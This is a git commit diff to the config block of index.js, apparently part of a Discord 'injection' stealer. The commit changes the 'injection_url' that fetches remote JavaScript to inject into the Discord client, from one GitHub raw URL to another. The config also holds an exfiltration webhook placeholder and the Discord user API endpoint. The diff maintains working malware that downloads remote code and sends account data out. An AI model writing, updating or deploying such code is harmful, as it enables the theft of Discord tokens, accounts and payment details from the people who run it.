1c40d7ad9cb6930ba900930544c3ab8d138dbbd4
latews1 <118557232+latews1@users.noreply.github.com>
2025-06-16 00:35:39 +0300

    Update index.js

--- index.js
+++ index.js
@@ -14,7 +14,7 @@ const config = {
     embed_icon: "~~icon~~",
     embed_color: 8363488,
     webhook: "%WEBHOOK_LINK%",
-    injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/Discord-Injection/main/file.js",
+    injection_url: "https://raw.githubusercontent.com/latews1/injection/refs/heads/main/index.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v9/users/@me",
     nitro: {
